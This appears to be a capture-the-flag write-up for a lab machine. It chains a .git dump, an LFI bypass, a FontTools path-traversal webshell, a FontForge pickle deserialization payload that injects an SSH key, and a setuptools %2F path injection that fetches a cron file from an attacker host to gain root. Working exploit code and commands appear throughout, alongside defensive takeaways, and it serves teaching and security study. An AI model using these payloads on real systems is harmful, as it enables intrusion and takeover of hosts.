Section 02

Recon & Foothold

01
Git Dump → Portal Credentials
git-dumper · .git exposed · gitbot credentials

A full port scan reveals only SSH and HTTP. Two vhosts are identified: the Flask variable font generator and a PHP internal validation portal. The PHP portal exposes a .git directory at its root — dumping the repository and reviewing commit history reveals hardcoded credentials committed in 753b5f5.

# Dump exposed .git repository from portal vhost
git-dumper http://portal.variatype.htb/.git/ ./portal_git
cd portal_git && git log -p

Misconfiguration: The .git directory is publicly accessible on the portal vhost. Git history is a permanent record — credentials committed and later removed are still fully recoverable. Never commit credentials; use environment variables or secrets managers.
02
LFI via str_replace Bypass — File Enumeration
download.php · ....// traversal · source disclosure

The portal's download.php endpoint sanitises path traversal with str_replace("../", "", $file). This is trivially bypassed: ....// becomes ../ after the single-pass replacement. Using this, the Flask application source, nginx configs, and a cron backup script are read — fully mapping the server's attack surface before exploitation.

# str_replace("../","") is single-pass — ....// → ../
curl -s -b cookies.txt \
  "http://portal.variatype.htb/download.php?f=....//....//....//....//....//etc/passwd"

root:x:0:0:root:/root:/bin/bash
...
steve:x:1000:1000::/home/steve:/bin/bash
variatype:x:1001:1001::/opt/variatype:/bin/false

# Key files read via LFI:
/opt/variatype/app.py                                    ← Flask source
/etc/nginx/sites-enabled/variatype.htb                   ← Flask proxied from 127.0.0.1:5000
/etc/nginx/sites-enabled/portal.variatype.htb            ← PHP root: /var/www/portal.variatype.htb/public
/etc/systemd/system/variatype.service                    ← Flask runs as variatype:www-data

Single-Pass Sanitisation: str_replace("../", "") is not recursive. The input ....// passes through: after one replacement the .. halves collapse and the remaining // forms ../. Always use realpath() and validate the resolved path starts within the allowed base directory.
Section 03

RCE as www-data — FontTools varLib Path Traversal

03
Designspace filename → PHP Webshell in Webroot
FontTools varLib · variable-font filename · PHP in name table

The Flask font generator runs fonttools varLib config.designspace on uploaded files. The .designspace XML format v5.0 supports a <variable-font filename="..."> attribute specifying where FontTools writes the output. No path sanitisation is applied. By setting the filename to a path traversal targeting the portal PHP webroot, the generated font file (containing embedded PHP in its name table) is written as a .php file. nginx routes .php requests to PHP-FPM, which executes the <?php ?> block found within the binary font data.

# familyName is stored in the font's name table (binary data in the output VF)
# PHP-FPM scans the entire .php file for  blocks — finds it in binary data
fb.setupNameTable({
    "familyName": "",
    "styleName": "Regular"
})
fb.font.save("/tmp/phpfont.ttf")
xml — malicious designspace (path traversal in filename)
<variable-fonts>
  <variable-font name="TestVF"
    filename="../../../var/www/portal.variatype.htb/public/cmd.php">
    <axis-subsets><axis-subset name="Weight"/></axis-subsets>
  </variable-font>
</variable-fonts>

Section 04

Lateral Movement — FontForge SFD Pickle

04
FontForge SFD PickledData Deserialization
cron · fontforge · PickledData: · pickle protocol 0 · SSH key injection

Steve's cron job (discovered via LFI on the backup script) runs FontForge on every .ttf file uploaded to the portal's files/ directory. FontForge detects file format by content, not extension — an SFD file renamed to .ttf is parsed as SFD. FontForge's SFD format supports a PickledData: field that is deserialized via pickle.loads() on parse. Critical constraint: the C code uses null-terminated strings, so only pickle protocol 0 (ASCII) is safe — higher protocols emit null bytes and truncate.

python3 — craft malicious SFD with pickle protocol 0
import pickle, os

class Exploit:
    def __reduce__(self):
        cmd = ('mkdir -p /home/steve/.ssh && chmod 700 /home/steve/.ssh && '
               'echo "ssh-ed25519 AAAA..." >> /home/steve/.ssh/authorized_keys && '
               'chmod 600 /home/steve/.ssh/authorized_keys')
        return (os.system, (cmd,))

# MUST use protocol=0 (ASCII) — C code uses null-terminated strings
# Protocol 1+ emits null bytes → string truncated → payload broken
payload = pickle.dumps(Exploit(), protocol=0)

# Escape backslashes and double-quotes for SFD format
escaped = b""
for b in payload:
    if b == ord('\\'): escaped += b'\\\\'
    elif b == ord('"'): escaped += b'\\"'
    else: escaped += bytes([b])

# SFD file with embedded pickle
sfd = f'''SplineFontDB: 3.2
FontName: TestFont
...
PickledData: "{escaped.decode('latin-1')}"
...
EndSplineFont'''

with open('exploit.sfd', 'wb') as f:
    f.write(sfd.encode('latin-1'))
bash — deploy via webshell + wait for cron
# Upload exploit.sfd with .ttf extension via webshell
# FontForge detects SFD format by content — extension is ignored
base64 exploit.sfd | curl -s "http://portal.variatype.htb/cmd.php" \
  --get --data-urlencode "c=echo <b64> | base64 -d > /var/www/portal.variatype.htb/public/files/EXPLOIT.ttf"

# Generate SSH keypair
ssh-keygen -t ed25519 -f htb_key -N ""

# Wait for steve's cron to process files/, then SSH
ssh -i htb_key steve@10.129.221.136
✕
Pickle Deserialization = Arbitrary Code Execution: FontForge's PickledData: field calls pickle.loads() with no sandbox or allowlist. Any process that opens an attacker-controlled SFD file executes arbitrary Python code as the invoking user. Never deserialize untrusted pickle data.

Section 05

Privilege Escalation — Setuptools %2F Path Injection

05
Sudo Script Analysis — PackageIndex.download()
setuptools 78.1.0 · install_validator.py · absolute path via %2F

Steve can run a Python validator installer as root with no password. The script calls setuptools.package_index.PackageIndex.download(url, PLUGIN_DIR). Inside _download_url(), the filename is extracted with egg_info_for_url(): it splits on literal / first, then URL-decodes the last component. If the last path segment contains %2F (URL-encoded slash), the decoded name becomes an absolute path — and os.path.join(PLUGIN_DIR, absolute_path) discards the plugin directory entirely, writing the downloaded content to the attacker-specified absolute path as root.

bash — sudo enumeration
sudo -l
(root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *

# The /opt/font-tools/validators/ directory exists
# Script calls: PackageIndex().download(plugin_url, PLUGIN_DIR)
python — how the path injection works
# URL: http://attacker:9999/x/%2Fetc%2Fcron.d%2Frootshell # Step 1: egg_info_for_url splits on literal / path.split('/')[-1] # → "%2Fetc%2Fcron.d%2Frootshell" # Step 2: urllib.parse.unquote() decodes %2F → / unquote(...) # → "/etc/cron.d/rootshell" ← absolute path! # Step 3: No ".." in name → filter passes # Step 4: os.path.join ignores PLUGIN_DIR when second arg is absolute os.path.join('/opt/font-tools/validators', '/etc/cron.d/rootshell') # → '/etc/cron.d/rootshell' ← written as ROOT! # Step 5: URL slash count: only 4 literal '/' → passes count(<=10) check
06

HTTP server payload · /etc/cron.d/ write · bash -p

A minimal Python HTTP server serves a cron job payload. The sudo command is triggered with a URL containing %2F-encoded slashes in the last path component, injecting the absolute path /etc/cron.d/rootshell. After ~60 seconds the cron runs as root and makes /bin/bash SUID, granting root execution via bash -p.

key takeaways
01 // GIT EXPOSURE
Never Expose .git in Production
An exposed .git directory allows full repository reconstruction including deleted secrets. Block access at the web server level with a location ~ /\.git deny rule. Use pre-commit hooks or tools like git-secrets to prevent credential commits in the first place.
02 // PATH TRAVERSAL
Single-Pass str_replace Is Not Path Sanitisation
str_replace("../", "") is bypassed by ....// — after one substitution the nested sequence collapses into the blocked string. Always resolve the full path with realpath() and verify it starts with the expected base directory before opening any file.
03 // FONTTOOLS VARLIB
designspace filename Attribute Lacks Sanitisation
FontTools uses the filename attribute in <variable-font> directly as an output path without any traversal check. Applications invoking FontTools on user-supplied designspace files must validate and canonicalise all output paths before processing.
04 // PICKLE DESERIALIZATION
FontForge SFD PickledData = Arbitrary Code Execution
FontForge deserializes PickledData: fields via pickle.loads() with no restrictions. Any process opening an attacker-controlled SFD file executes arbitrary code. Cron jobs that process untrusted font files create a reliable lateral movement vector. Font processors should run in sandboxed environments with no network or filesystem write access.
05 // URL DECODING
Setuptools %2F Absolute Path Write
Splitting a URL path on literal / before URL-decoding means %2F in the last component survives the split and decodes to an absolute path. os.path.join() then discards the intended base directory. Always URL-decode before splitting, and validate that the resulting filename contains no / characters.
06 // SUDO HARDENING
Sudo Scripts That Fetch Remote Content Are Dangerous
A root-privileged script that downloads content from an attacker-controlled URL and writes it to disk is equivalent to an arbitrary file write as root. Sudo rules for installer scripts should restrict URLs to trusted registries, validate checksums, and write output only to tightly scoped, non-sensitive directories.
